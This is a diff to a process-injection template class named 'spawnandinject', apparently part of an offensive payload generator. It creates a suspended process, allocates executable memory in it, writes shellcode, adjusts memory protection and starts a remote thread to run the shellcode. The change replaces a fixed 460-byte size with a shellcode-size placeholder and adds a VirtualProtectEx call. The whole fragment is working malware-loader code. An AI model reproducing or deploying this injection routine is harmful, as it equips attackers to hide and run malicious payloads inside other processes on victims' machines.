@@ -27,9 +27,12 @@ class spawnandinject:
 
     {CreateProcessA}(c.NULL, c.Pointer(target), c.NULL, c.NULL, 0, 0x4, c.NULL, c.NULL, c.Pointer(si), c.Pointer(pi))
 
-    local address = {VirtualAllocEx}(pi.hProcess, c.NULL, 460, 0x3000, 0x40)
+    local address = {VirtualAllocEx}(pi.hProcess, c.NULL, {shellcodeSize}, 0x3000, 0x40)
 
-    {WriteProcessMemory}(pi.hProcess, address, c.Pointer(shellcode[0]), 460, c.NULL)
+    {WriteProcessMemory}(pi.hProcess, address, c.Pointer(shellcode[0]), {shellcodeSize}, c.NULL)
+
+    local oldProtect = c.uint32_t()
+    {VirtualProtectEx}(pi.hProcess, address, {shellcodeSize}, 0x40, c.Pointer(oldProtect))
 
     local hThread = {CreateRemoteThread}(pi.hProcess, c.NULL, 0, address, c.NULL, 0, c.NULL)
 
